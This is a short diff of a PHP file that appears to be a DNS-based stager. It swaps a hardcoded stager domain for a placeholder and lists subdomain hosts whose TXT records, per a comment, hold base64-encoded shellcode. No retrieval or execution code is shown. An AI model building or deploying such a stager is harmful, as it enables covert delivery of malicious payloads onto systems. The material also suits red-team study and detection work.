@@ -5,7 +5,7 @@ $current_uri = $_SERVER['REQUEST_URI'];
 
 
 // stager domain info 
-$domain = "ired.dev";
+$domain = "DOMAIN_VALUE";
 $hosts = ['a', 'b', 'c','d','e','f','g','h','i','j','k','l','m','n']; // Specify the hosts you want to retrieve TXT records from, remote.txt shellcode base64 content is stored as TXT record 
 
 
